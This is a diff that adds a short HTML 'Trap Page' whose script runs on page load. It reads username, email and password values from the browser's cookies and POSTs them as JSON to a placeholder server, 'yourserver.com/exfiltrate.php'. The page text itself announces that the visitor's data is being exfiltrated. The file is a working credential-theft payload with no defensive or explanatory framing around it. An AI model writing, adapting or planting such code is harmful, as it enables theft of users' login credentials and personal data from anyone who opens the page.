@@ -1,0 +1,32 @@
+html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trap Page</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Collect user data
+            var userData = {
+                username: document.cookie.split('; ').find(row => row.startsWith('username=')).split('=')[1],
+                email: document.cookie.split('; ').find(row => row.startsWith('email=')).split('=')[1],
+                password: document.cookie.split('; ').find(row => row.startsWith('password=')).split('=')[1]
+            };
+
+            // Send data to the owner
+            fetch('http://yourserver.com/exfiltrate.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(userData)
+            });
+        });
+    </script>
+</head>
+<body>
+    <h1>Welcome to the Trap!</h1>
+    <p>Your data is being exfiltrated as we speak.</p>
+</body>
+</html>
